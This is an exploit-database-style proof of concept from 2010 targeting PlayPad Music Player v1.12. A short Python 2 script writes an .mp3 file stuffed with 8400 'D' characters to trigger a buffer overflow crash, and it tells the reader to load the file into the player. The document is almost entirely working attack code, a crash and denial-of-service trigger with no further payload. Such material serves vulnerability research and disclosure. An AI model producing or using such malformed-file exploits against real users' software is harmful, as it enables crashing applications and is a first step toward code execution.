# Exploit Title: PlayPad Music Player v1.12 .mp3 File Processing BoF/Crash
# Date: 20th August, 2010
# Author: Praveen Darshanam
# Software Link:
http://software-files-l.cnet.com/s/software/11/36/36/00/playsetup.exe?e=1282332392&h=9edf959c2f8f5a185881921969d667b8&lop=link&ptype=1901&ontid=2139&siteId=4&edId=3&spi=5dd11a728135fb7ad93544f5b51ee29a&pid=11363600&psid=75176763&fileName=playsetup.exe
# Version: 1.12
# Tested on: Windows XP Pro. SP2
print "\n\nPlayPad Music Player v1.12 .mp3 File Processing BoF/Crash"

buff = "D" * 8400

try:
    mp3file = open("ppmp_crash.mp3","w")
    mp3file.write(buff)
    mp3file.close()
    print "[+] Successfully created MP3 File\n"
    print "[+] Load this File to PlayPad Player, you can see a Crash\n"
    print "[+] Coded by Praveen Darshanam\n"
except:
    print "[+] Unable to Create File"